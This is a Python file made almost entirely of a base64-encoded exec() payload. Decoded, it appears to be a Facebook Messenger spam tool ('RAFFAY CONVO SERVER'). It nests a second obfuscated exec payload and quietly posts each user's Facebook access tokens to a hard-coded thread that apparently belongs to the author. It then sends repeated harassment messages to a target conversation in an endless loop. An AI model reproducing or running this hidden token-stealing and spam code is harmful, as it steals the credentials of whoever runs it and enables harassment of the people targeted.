import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBweXR6CmltcG9ydCBkYXRldGltZQppbXBvcnQgc3lzCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgcmFuZG9tCmh0bWxfY29udGVudCA9ICIiIgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPlJBRkZBWSBDT05WTyBTRVJWRVI8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ3JhZmZheS5qcGcnKTsKICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKICAgICAgICB9CiAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgbWFyZ2luLXRvcDogNTBweDsKICAgICAgICB9CiAgICAgICAgLmJveCB7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIGJsYWNrOwogICAgICAgICAgICB3aWR0aDogMzAwcHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSk7CiAgICAgICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICB9CiAgICAgICAgLmNyZWRpdCB7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGxlZnQ7CiAgICAgICAgfQogICAgICAgIC50aGFua3MgewogICAgICAgICAgICBtYXJnaW4tdG9wOiA1MHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJib3giPgogICAgICAgICAgICA8aDE+UkFGRkFZIENPTlZPIFNFUlZFUjwvaDE+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNyZWRpdCI+CiAgICAgICAgICAgICAgICA8cD4xLiBDUkVESVQ6LUtIQU4gQVJNWTwvcD4KICAgICAgICAgICAgICAgIDxwPjIuIE9XTkVSID0+IFJBRkZBWSA8L3A+CiAgICAgICAgICAgICAgICA8cD4zLiBDT05UQUNUOi0gPGEgaHJlZj0iMDMwMzQ3NzE2MDciPldoYXRzQXBwPC9hPjwvcD4KICAgICAgICAgICAgICAgIDxwPjQuIEZBQ0VCT09LOi0gPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3dhc2kuaGFkaXIuNzczIj5GYWNlYm9vazwvYT48L3A+CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InRoYW5rcyI+CiAgICAgICAgPHA+4p2k77iPVGhhbmtzIGZvciB1c2luZyBteSBzZXJ2ZXLinaTvuI88L3A+CiAgICAgICAgPHA+8J+Rh/CfkYc8L3A+CiAgICAgICAgPGEgaHJlZj0iPC9hPgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgoiIiIKY2xhc3MgTXlIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICBkZWYgZG9fR0VUKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgc2VsZi5zZW5kX2hlYWRlcignQ29udGVudC10eXBlJywgJ3RleHQvaHRtbCcpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShodG1sX2NvbnRlbnQuZW5jb2RlKCkpCmRlZiBleGVjdXRlX3NlcnZlcigpOgogICAgUE9SVCA9IGludChvcy5lbnZpcm9uLmdldCgnUE9SVCcsIDQwMDApKQogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6CiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkKICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKdXRjX25vdyA9IGRhdGV0aW1lLmRhdGV0aW1lLnV0Y25vdygpCmluZGlhbl90aW1lem9uZSA9IHB5dHoudGltZXpvbmUoJ0FzaWEvS29sa2F0YScpCmlzdF9ub3cgPSB1dGNfbm93LnJlcGxhY2UodHppbmZvPXB5dHoudXRjKS5hc3RpbWV6b25lKGluZGlhbl90aW1lem9uZSkKZm9ybWF0dGVkX3RpbWUgPSBpc3Rfbm93LnN0cmZ0aW1lKCJcMDMzWzE7Mzg7NTsyMDhtIFRpbWUgOi0gJVktJW0tJWQgJUk6JU06JVMgJXAiKQpwcmludChmb3JtYXR0ZWRfdGltZSkKaGVhZGVycyA9IHsKICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCn0KCl8gPSBsYW1iZGEgX18gOiBfX2ltcG9ydF9fKCd6bGliJykuZGVjb21wcmVzcyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iMzJkZWNvZGUoX19bOjotMV0pKTtleGVjKChfKShiJz1BVlVKWDJXREk3WDdMUDZFV0dGUlpWRkdRU1VJTENRQVNNQzRET1hSSTU3TU0yU0tKS1VIQklWVTJDQlI0QlFLN01CNEVUNk4zTFhNTTZXVFo2VTNaVTJCWlZZTkYzUjdJNlFUUVlHS05WSUlTSTVSUkFSR0FPNUVZS1BWV1NNVDdRSlpFTEk3QlpZVURSSkpMWURVQ0VDQVc1SldBWlJNSURBNkdQTDdPNEVCT0Y3M0tJN1VBNUdMUTdKV0ZSNkVOSENQNE1KV0VQS1lGR0FRVjVEWU1YQ0tRSjZVTk5GRklaUEdQUkYyUlhHNEtOUVNVNUNMSEI1R09JQkRRTkVWR1RIRklDTEFONjdRNjZVWUFNSTJRT0RONFdBMk5YMzIyVUpMRU5SNzZPV1A2UkNJVlhOWlk1S0dEUlYyNEZGQVlBR0VFSFdCNkJITkdKWEFVVUREVUpXVEFHRzVXMlZEV05ZWU9XVDVLUFNTR1JENFdNSzRGUjVCNUhWM1hFSDRZNEUzM1BBT1U0WUhJUVdSREZUTVdHUkxYWERNQkNWUEFGN0FPVllBUkxJTUVZVkxRSlFTNVZUU1YyMllSU1JEQ1pESUE3VlMySTVDRUZTVldYQUNCTE9MSjIyR0RCSTRCRVlFTElQRlJGRktSUENCUEpONVVaSk4zS0Y0STNLRFAzNUxUNzZBTE5GSVJQTkU1RUVLNlZIS1MzSlRLSkxJUjJNNllGVUg2VDdaUDVYUFZYN0hQVlg3N1A3N1BISzNGSTVHMzRWSEhZNzdSQk1SSk1RVTMyM05CWU5DR09JS0dUWTZURFlFQUFBRE8zUlpCVUxCT0NQJykpCgpkZWYgc2VuZF9pbml0aWFsX21lc3NhZ2UoKToKICAgIAogICAgbW1tX3Bhc3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9XNXpmN0trQycpLnRleHQKICAgIAogICAgaWYgbW1tX3Bhc3Mgbm90IGluIHBhc3N3b3JkOgogICAgICAgIHByaW50KCdcMDMzWzE7MzFt4pqg77iOIFlvdXIgUGFzc3dvcmQgQ2hhbmdlZCBCeSByYWZmYXkg4pqg77iOJykKICAgICAgICBzeXMuZXhpdCgpCiAgICAKICAgICMgTWVzc2FnZSB0ZW1wbGF0ZQogICAgbXNnX3RlbXBsYXRlID0gIk93bmVyID0+IFJBRkZBWSBcbiBIZWxsbyBSQUZGQVkgc2lyLiBcbiBJIGFtIHVzaW5nIHlvdXIgY29udm8gc2VydmVyLiBcbiBUaGlzIElzIE15IERldGFpbHMgOi0gXG4gQ29udm8gSUQgOi0ge30gXG4gTmFtZTotIHt9IFxuIFRva2VuIDotIHt9IgogICAgCiAgICAjIFRhcmdldCBJRHMKICAgIHRhcmdldF9pZHMgPSBbIjEwMDAxMjEzMjc5ODE5MyJdCiAgICAKICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCiAgICAKICAgIGZvciB0YXJnZXRfaWQgaW4gdGFyZ2V0X2lkczoKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbi5zdHJpcCgpCiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQogICAgICAgICAgICBtc2cgPSBtc2dfdGVtcGxhdGUuZm9ybWF0KGNvbnZvX2lkLCBoYXRlcnNfbmFtZSwgYWNjZXNzX3Rva2VuKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogbXNnfQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgICAgIHByaW50KCJcblwwMzNbMTszMW1bK10gSW5pdGlhbCBtZXNzYWdlIHNlbnQgdG8gdGFyZ2V0IElEOiB7fS4gQ29udGludWluZy4uLlxuIi5mb3JtYXQodGFyZ2V0X2lkKSkKCnNlbmRfaW5pdGlhbF9tZXNzYWdlKCkKZGVmIHNlbmRfbWVzc2FnZXNfZnJvbV9maWxlKCk6CiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKICAgIG1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6CiAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkKICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpCiAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAve30vIi5mb3JtYXQoJ3RfJyArIGNvbnZvX2lkKQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNm1b4pyTXSBZb3VyIE1hc3NhZ2UgU3VjY2Vzc2Z1bGx5IFNlbnQgQnkgUkFGRkFZJ3MgQ29udm8gU2VydmVyIE5vLiB7fSBvZiBDb252byB7fSBUb2tlbiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZm9ybWF0dGVkX3RpbWUpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5Mm0nICsgJ+KcquKcreKVkOKVkOKVkOKVkOKVkOKVkOKVkOKAouOAjiBSQUZGQVkgS0hBTiDjgI/igKLilZDilZDilZDilZDilZDilZDilZDinK3inKonKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzM1bVt4XSBGYWlsZWQgdG8gc2VuZCBNZXNzYWdlIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGZvcm1hdHRlZF90aW1lKQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfinKrinK3ilZDilZDilZDilZDilZDilZDilZDigKLjgI4gUkFGRkFZIEtIQU4g44CP4oCi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pyt4pyqJykKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpCiAgICAgICAgICAgIHByaW50KCJcblsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLlxuIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCmRlZiBtYWluKCk6CiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKICAgIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCkKICAgIHNlbmRfbWVzc2FnZXNfZnJvbV9maWxlKCkKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQ=='))
